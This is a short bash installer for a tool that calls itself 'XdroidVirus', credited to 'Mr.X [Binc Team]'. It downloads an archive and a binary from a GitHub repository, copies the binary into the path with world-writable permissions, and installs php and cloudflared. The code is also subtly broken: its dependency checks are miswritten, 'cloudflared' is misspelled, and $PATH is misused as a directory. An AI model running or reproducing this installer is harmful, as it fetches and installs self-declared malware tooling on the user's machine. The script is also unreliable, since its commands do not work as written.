#!/bin/bash
clear
echo $'\33[35;1m'""
figlet -f smblock "              XdroidVirus"
echo ""
echo $'\e[36;1m'"                   by Mr.X"$'\e[31;1m'" ["$'\e[37;1m'"Binc Team"$'\e[31;1m'"]"
echo
echo -e "\e[0;1m-----------------------------------------------------------\e[0m"
echo -e "\e[32;1mInstalling XdroidVirus.....\n"
if [[ -d "$HOME/.fxv" ]] ; then
    printf "Virus directory found skipping installation\n"
else
    printf "Installing requirements it may take some time\n"
    cd 
    curl -LO https://github.com/Whomrx666/XdroidVirus/raw/main/lib/av.tar.gz
    curl -LO https://github.com/Whomrx666/XdroidVirus/raw/main/lib/av
    mv av $PATH ; chmod 777 $PATH/av
    if hash ! php > /dev/null 2>&1 ; then
        printf "installing php..."
        apt install -y php
    fi
    if hash ! cloudfalred > /dev/null 2>&1 ; then
        printf "installing cloudflared..."
        apt install -y cloudflared
    fi
    tar -zxf av.tar.gz > /dev/null 2>&1
    rm av.tar.gz > /dev/null 2>&1 
fi
echo -e "\e[0m
Author:Mr.X

Run the tool by typing \e[32;1m'av'\e[0m from anywhere
"

